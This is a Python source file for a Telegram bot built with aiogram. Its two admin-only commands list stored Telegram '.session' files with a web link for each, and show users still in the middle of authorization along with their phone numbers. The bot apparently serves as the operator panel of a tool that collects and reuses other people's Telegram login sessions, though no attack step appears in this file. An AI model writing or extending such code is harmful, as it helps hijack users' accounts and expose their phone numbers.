import os
import glob
from aiogram import Router
from aiogram.types import Message
from aiogram.filters import Command

from config import SESSIONS_DIR, WEB_URL, ADMIN_ID
from bot import storage

router = Router()


def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID


@router.message(Command("alllinks"))
async def cmd_alllinks(message: Message):
    if not is_admin(message.from_user.id):
        return
    
    sessions = glob.glob(os.path.join(SESSIONS_DIR, "*.session"))
    
    if not sessions:
        await message.answer("📭 Нет сессий")
        return
    
    lines = ["📋 <b>Все ссылки:</b>\n"]
    for path in sessions:
        sid = os.path.basename(path).replace(".session", "")
        uid = sid.replace("user_", "")
        link = f"{WEB_URL}?session={sid}"
        lines.append(f"• <code>{uid}</code>\n  {link}")
    
    await message.answer("\n".join(lines), parse_mode="HTML")


@router.message(Command("sessions"))
async def cmd_sessions(message: Message):
    if not is_admin(message.from_user.id):
        return
    
    active = list(storage.clients.keys())
    
    if not active:
        await message.answer("📭 Нет активных сессий (все завершили авторизацию)")
        return
    
    lines = ["🔄 <b>Активные сессии (в процессе авторизации):</b>\n"]
    for uid in active:
        auth = storage.get_auth(uid)
        phone = auth.get("phone", "?") if auth else "?"
        lines.append(f"• <code>{uid}</code> — {phone}")
    
    await message.answer("\n".join(lines), parse_mode="HTML")
